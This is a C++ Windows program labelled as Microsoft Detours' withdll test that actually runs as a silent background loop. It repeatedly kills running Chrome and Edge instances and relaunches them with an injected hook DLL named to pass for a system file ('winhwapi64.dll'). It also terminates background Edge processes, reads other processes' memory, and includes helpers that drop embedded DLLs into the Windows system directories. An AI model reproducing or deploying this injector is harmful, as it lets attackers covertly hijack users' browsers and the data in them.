//////////////////////////////////////////////////////////////////////////////
//
//  Test DetourCreateProcessWithDll function (withdll.cpp).
//
//  Microsoft Research Detours Package
//
//  Copyright (c) Microsoft Corporation.  All rights reserved.
//
#include <stdio.h>
#include <windows.h>

#include "detours.h"
#include <strsafe.h>
#include <Shlwapi.h>
#include <Shlobj.h>
#include <filesystem>
#include "resource1.h"
#include <iostream>
#include <string>
#include <Psapi.h>
#include <algorithm>    // std::find_if
#include <comdef.h>
#include <Wbemidl.h>
#include <comdef.h>
#include <thread>
#include <vector>
#include <functional>
#include <Iphlpapi.h>
#include <Tlhelp32.h>
#include <Thread>
#include <fstream>
#include <winternl.h>

using namespace std;
#define fs std::filesystem

#include <functional>

void RunChromeWithDll();

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "wbemuuid.lib")


#ifdef _WIN64
    #define HOOK_DLL_NAME "winhwapi64.dll"
    #define IDR_DLL IDR_HOOK_DLL_X641
    #define IDR_TYPE "HOOK_DLL_X64"
#else
    #define HOOK_DLL_NAME "winhwapi32.dll"
    #define IDR_DLL IDR_HOOK_DLL_X861
    #define IDR_TYPE "HOOK_DLL_X86"
#endif // _WIN64

typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
    HANDLE ProcessHandle,
    DWORD ProcessInformationclass,
    PVOID ProcessInformation,
    DWORD ProcessInformationLength,
    PDWORD ReturnLength
    );
WCHAR* GetProcessCommandLine(HANDLE hProcess);

void RunChromeWithDll()
{
    CHAR szChromePath[MAX_PATH] = { 0 };
    CHAR szNativeProgramFilesFolder[MAX_PATH];

#ifdef _WIN64
    ExpandEnvironmentStrings("%ProgramW6432%",
        szNativeProgramFilesFolder,
        ARRAYSIZE(szNativeProgramFilesFolder));
#else
    BOOL bWow64Process = FALSE;

    const auto handle = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION, false, GetCurrentProcessId());
    if (IsWow64Process(handle, &bWow64Process) && bWow64Process) {
        ExpandEnvironmentStrings("%ProgramW6432%",
            szNativeProgramFilesFolder,
            ARRAYSIZE(szNativeProgramFilesFolder));
    }
    else {
        ExpandEnvironmentStrings("%PROGRAMFILES%",
            szNativeProgramFilesFolder,
            ARRAYSIZE(szNativeProgramFilesFolder));
    }
    CloseHandle(handle);
#endif
    strcat_s(szChromePath, szNativeProgramFilesFolder);
    strcat_s(szChromePath, "\\google\\chrome\\Application\\chrome.exe");

    int nDlls = 1;
    LPCSTR rpszDllsOut[256] = { HOOK_DLL_NAME };

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    CHAR szCommand[2048];

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);

    DWORD dwFlags = CREATE_DEFAULT_ERROR_MODE | CREATE_SUSPENDED;

    for (int i = 0; i < 5; i++) {
        if (!DetourCreateProcessWithDllsA(szChromePath, szCommand,
            NULL, NULL, TRUE, dwFlags, NULL, NULL,
            &si, &pi, nDlls, rpszDllsOut, NULL)) {
            Sleep(1000);
            continue;
        }
        else
            break;
    }
    ResumeThread(pi.hThread);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
void RunEdgeWithDll()
{
    CHAR szChromePath[MAX_PATH] = { 0 };
    CHAR szNativeProgramFilesFolder[MAX_PATH];

#ifdef _WIN64
    ExpandEnvironmentStrings("%programfiles(x86)%",
        szNativeProgramFilesFolder,
        ARRAYSIZE(szNativeProgramFilesFolder));
#else
    BOOL bWow64Process = FALSE;

    const auto handle = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION, false, GetCurrentProcessId());
    if (IsWow64Process(handle, &bWow64Process) && bWow64Process) {
        ExpandEnvironmentStrings("%PROGRAMFILES%",
            szNativeProgramFilesFolder,
            ARRAYSIZE(szNativeProgramFilesFolder));
    }
    else {
        ExpandEnvironmentStrings("%PROGRAMFILES%",
            szNativeProgramFilesFolder,
            ARRAYSIZE(szNativeProgramFilesFolder));
    }
    CloseHandle(handle);
#endif
    strcat_s(szChromePath, szNativeProgramFilesFolder);
    strcat_s(szChromePath, "\\Microsoft\\Edge\\Application\\msedge.exe");

    int nDlls = 1;
    LPCSTR rpszDllsOut[256] = { HOOK_DLL_NAME };

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    CHAR szCommand[2048];

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);

    DWORD dwFlags = CREATE_DEFAULT_ERROR_MODE | CREATE_SUSPENDED;

    for (int i = 0; i < 5; i++) {
        if (!DetourCreateProcessWithDllsA(szChromePath, szCommand,
            NULL, NULL, TRUE, dwFlags, NULL, NULL,
            &si, &pi, nDlls, rpszDllsOut, NULL)) {
            Sleep(1000);
            continue;
        }
        else
            break;
    }
    ResumeThread(pi.hThread);
    WaitForSingleObject(pi.hProcess, INFINITE);
}
BOOL ReleaseLibrary(UINT uResourceId, const CHAR* szResourceType, const CHAR* szFileName)
{
    HRSRC hRsrc = FindResourceA(NULL, MAKEINTRESOURCEA(uResourceId), szResourceType);
    if (hRsrc == NULL)
    {
        return FALSE;
    }
    DWORD dwSize = SizeofResource(NULL, hRsrc);
    if (dwSize <= 0)
    {
        return FALSE;
    }
    HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
    if (hGlobal == NULL)
    {
        return FALSE;
    }
    LPVOID lpRes = LockResource(hGlobal);
    if (lpRes == NULL)
    {
        return FALSE;
    }
    HANDLE hFile = CreateFile(szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == NULL)
    {
        return FALSE;
    }
    DWORD dwWriten = 0;
    BOOL bRes = WriteFile(hFile, lpRes, dwSize, &dwWriten, NULL);
    if (bRes == FALSE || dwWriten <= 0)
    {
        return FALSE;
    }
    CloseHandle(hFile);
    return TRUE;
}
void ReleaseFileToSysDir(UINT uResourceId, const CHAR* szResourceType, const CHAR* szFileName)
{
    CHAR szDLLFile[MAX_PATH] = { 0 };

    GetSystemDirectoryA(szDLLFile, MAX_PATH);
    fs::path path = fs::path(szDLLFile) / szFileName;

    ReleaseLibrary(uResourceId, szResourceType, path.string().c_str());
}
string ReleaseFileToSysWow64Dir(UINT uResourceId, const CHAR* szResourceType, const CHAR* szFileName)
{
    CHAR szDLLFile[MAX_PATH] = { 0 };

    GetWindowsDirectoryA(szDLLFile, MAX_PATH);
    strcat_s(szDLLFile, "\\syswow64");
    fs::path path = fs::path(szDLLFile) / szFileName;

    ReleaseLibrary(uResourceId, szResourceType, path.string().c_str());

    return path.string();
}
void RunProcess(LPCSTR lpPath)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    // Start the child process. 
    if (!CreateProcess(lpPath,   // No module name (use command line)
        NULL,        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi)           // Pointer to PROCESS_INFORMATION structure
        )
    {
        printf("CreateProcess failed (%d).\n", GetLastError());
        return;
    }
    // Close process and thread handles. 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}
BOOL isChrome(char* name, DWORD pid)
{
    BOOL bRet = FALSE;

    if (_stricmp("chrome.exe", name) == 0)
    {
        HANDLE Handle = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
            FALSE,
            pid
        );
        if (Handle)
        {
            TCHAR Buffer[MAX_PATH];
            if (GetModuleFileNameEx(Handle, 0, Buffer, MAX_PATH))
            {
                fs::path path(Buffer);

                if (path.stem().string() != "chrome") {
                    bRet = TRUE;
                }
            }
            CloseHandle(Handle);
        }
    }
    return bRet;
}
BOOL isEdge(char* name, DWORD pid)
{
    BOOL bRet = FALSE;

    if (_stricmp("msedge.exe", name) == 0)
    {
        HANDLE Handle = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
            FALSE,
            pid
        );
        if (Handle)
        {
            TCHAR Buffer[MAX_PATH];
            if (GetModuleFileNameEx(Handle, 0, Buffer, MAX_PATH))
            {
                fs::path path(Buffer);

                if (path.stem().string() != "msedge") {
                    bRet = TRUE;
                }
            }
            else {
                bRet = TRUE;
            }
            CloseHandle(Handle);
        }
    }
    return bRet;
}
BOOL CheckChromeRun()
{
    HANDLE hSnapshot = NULL;
    PROCESSENTRY32 pe;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    pe.dwSize = sizeof(pe);
    Process32First(hSnapshot, &pe);

    DWORD dwChromeId  = 0;
    int iChromeChild = 0;
    do
    {
        if (isChrome(pe.szExeFile, pe.th32ParentProcessID)) {
            dwChromeId = pe.th32ProcessID;
#ifdef _WIN64
            //BOOL bWow64Process = FALSE;

            //if (IsWow64Process(chrome, &bWow64Process) && bWow64Process) {

            //    string path = ReleaseFileToSysWow64Dir(IDR_INJECT_EXE_X86, "INJECT_EXE_X86", INJECT_EXE_X86);
            //    RunProcess(path.c_str());
            //    exit(0);
            //}
#endif
        }
        else {
            if (dwChromeId > 0 && pe.th32ParentProcessID == dwChromeId) {
                iChromeChild++;
            }
        }
    } while (Process32Next(hSnapshot, &pe));
    CloseHandle(hSnapshot);

    if (iChromeChild >= 4 && dwChromeId > 0) {
        const auto chrome = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION, false, dwChromeId);
        OutputDebugStringA("test chrome____________0");
        BOOL bRet = TerminateProcess(chrome, 0);
        if (!bRet) {
            OutputDebugStringA("test chrome____________1");
            HANDLE hEvent = OpenEvent(EVENT_ALL_ACCESS, FALSE, "Global\\sa_evt_o");
            if (hEvent)
            {
                OutputDebugStringA("test chrome____________2");
                SetEvent(hEvent);
                CloseHandle(hEvent);
                Sleep(1000);
            }
        }
        CloseHandle(chrome);
        OutputDebugStringA("test chrome____________3");
        RunChromeWithDll();
        OutputDebugStringA("test chrome____________4");
    }
    return TRUE;
}
BOOL CheckEdgeRun()
{
    HANDLE hSnapshot = NULL;
    PROCESSENTRY32 pe;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    pe.dwSize = sizeof(pe);
    Process32First(hSnapshot, &pe);

    DWORD dwChromeId = 0;
    int iChromeChild = 0;
    do
    {
        if (isEdge(pe.szExeFile, pe.th32ParentProcessID)) {
            HANDLE Handle = OpenProcess(
                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ| PROCESS_TERMINATE,
                FALSE,
                pe.th32ProcessID
            );
            if (Handle) {
                LPWSTR lpcmd = GetProcessCommandLine(Handle);

                if (lpcmd && StrStrIW(lpcmd, L"no-startup-window")) {
                    OutputDebugStringA("test edge kill____________");
                    TerminateProcess(Handle, 0);
                }
                else {
                    dwChromeId = pe.th32ProcessID;
                }
                if (lpcmd)
                    free(lpcmd);

                CloseHandle(Handle);
            }
        }
        else {
            if (dwChromeId > 0 && pe.th32ParentProcessID == dwChromeId) {
                iChromeChild++;
            }
        }
    } while (Process32Next(hSnapshot, &pe));
    CloseHandle(hSnapshot);

    if (iChromeChild > 4 && dwChromeId > 0) {
        const auto chrome = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION, false, dwChromeId);
        OutputDebugStringA("test edge____________0");
        BOOL bRet = TerminateProcess(chrome, 0);
        if (!bRet) {
            OutputDebugStringA("test edge____________1");
            HANDLE hEvent = OpenEvent(EVENT_ALL_ACCESS, FALSE, "Global\\sa_evt_o");
            if (hEvent)
            {
                OutputDebugStringA("test edge____________2");
                SetEvent(hEvent);
                CloseHandle(hEvent);
                Sleep(1000);
            }
        }
        CloseHandle(chrome);
        OutputDebugStringA("test edge____________3");
        RunEdgeWithDll();
        OutputDebugStringA("test edge____________4");
    }
    return TRUE;
}
bool checkProcessRunning()
{
    HANDLE hMutexOneInstance(::CreateMutex(NULL, TRUE, "{GGG5B98-0E3D-4B3B-A724-57DB0D76F78F}"));
    bool bAlreadyRunning((::GetLastError() == ERROR_ALREADY_EXISTS));

    if (hMutexOneInstance == NULL || bAlreadyRunning)
    {
        if (hMutexOneInstance)
        {
            ::ReleaseMutex(hMutexOneInstance);
            ::CloseHandle(hMutexOneInstance);
        }
        return true;
    }
    return false;
}
int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow)
{
    if (checkProcessRunning())//Mutex to not run the.exe more than once
        return -1;

    //ReleaseFileToSysDir(IDR_DLL, IDR_TYPE, HOOK_DLL_NAME);

    std::thread h([=]() {
        while (TRUE) {
            CheckEdgeRun();
            Sleep(10);
        }
        });
    h.detach();

    while (TRUE) {
        CheckChromeRun();
        Sleep(10);
    }
    return 0;
}

WCHAR* GetProcessCommandLine(HANDLE hProcess)
{
    UNICODE_STRING commandLine;
    WCHAR* commandLineContents = NULL;
    _NtQueryInformationProcess NtQuery = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

    if (NtQuery) {

        PROCESS_BASIC_INFORMATION pbi;
        NTSTATUS isok = NtQuery(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);

        if (NT_SUCCESS(isok))
        {
            PEB peb;
            RTL_USER_PROCESS_PARAMETERS upps;
            PVOID rtlUserProcParamsAddress;
            if (ReadProcessMemory(hProcess, &(((_PEB*)pbi.PebBaseAddress)->ProcessParameters), &rtlUserProcParamsAddress, sizeof(PVOID), NULL))
            {
                if (ReadProcessMemory(hProcess,
                    &(((_RTL_USER_PROCESS_PARAMETERS*)rtlUserProcParamsAddress)->CommandLine),
                    &commandLine, sizeof(commandLine), NULL)) {

                    commandLineContents = (WCHAR*)malloc(commandLine.Length+sizeof(WCHAR));
                    memset(commandLineContents, 0, commandLine.Length + sizeof(WCHAR));
                    ReadProcessMemory(hProcess, commandLine.Buffer,
                        commandLineContents, commandLine.Length, NULL);
                }
            }
        }
    }
    return commandLineContents;
}
//
///////////////////////////////////////////////////////////////// End of File.
